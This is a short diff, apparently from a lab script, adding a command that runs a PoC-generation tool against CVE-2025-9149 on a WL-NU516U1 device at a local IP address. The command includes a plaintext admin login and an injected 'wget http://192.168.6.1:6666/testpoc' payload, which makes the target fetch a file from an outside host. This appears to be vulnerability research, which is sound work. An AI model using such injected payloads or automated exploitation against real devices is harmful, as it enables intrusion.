@@ -99,3 +99,12 @@ python3 -m PoCGen.cli \
   --auto-validate --max-iters 5  \
   --payload "wget http://192.168.6.1:6666/testpoc"
 
+python3 -m PoCGen.cli \
+  --desc /home/li/LLM_POC/vul_func_desc_poc/WL-NU516U1/CVE-2025-9149/httpd_vulcode_description.txt \
+  --code "/home/li/LLM_POC/vul_func_desc_poc/WL-NU516U1/CVE-2025-9149/相关函数/*.c" \
+  --target https://192.168.1.225 \
+  --probe-target --browser-login \
+  --login-url https://192.168.1.225 \
+  --login-username admin --login-password 20030303xX! \
+  --auto-validate --max-iters 5 \
+  --payload "wget http://192.168.6.1:6666/testpoc"
